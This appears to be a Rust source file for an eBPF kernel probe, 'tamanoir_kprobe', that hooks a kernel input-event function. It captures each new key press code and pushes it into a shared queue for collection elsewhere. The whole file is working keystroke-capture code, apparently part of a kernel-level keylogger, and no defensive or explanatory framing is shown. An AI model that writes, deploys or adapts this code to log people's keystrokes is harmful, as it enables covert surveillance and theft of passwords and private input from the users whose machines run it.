use aya_ebpf::{
    macros::{kprobe, map},
    maps::Array,
    programs::ProbeContext,
};

use crate::common::DATA;
const KEY_EVENT: u32 = 1;

#[map]
static LAST_KEY: Array<u32> = Array::with_max_entries(1, 0);

#[kprobe]
pub fn tamanoir_kprobe(ctx: ProbeContext) -> u32 {
    match kprobe_process(ctx) {
        Ok(ret) => ret,
        Err(ret) => ret,
    }
}

fn kprobe_process(ctx: ProbeContext) -> Result<u32, u32> {
    let event_type: u32 = ctx.arg(1).ok_or(0u32)?;
    let code: u32 = ctx.arg(2).ok_or(0u32)?;
    let value: u32 = ctx.arg(3).ok_or(0u32)?;

    if event_type == KEY_EVENT && value != 0 {
        if let Some(key) = LAST_KEY.get_ptr_mut(0) {
            if unsafe { *key } == code {
                unsafe { *key = 0 };
            } else {
                unsafe { *key = code };
                let _ = DATA.push(&code, 0);
            }
        }
    }

    Ok(0)
}
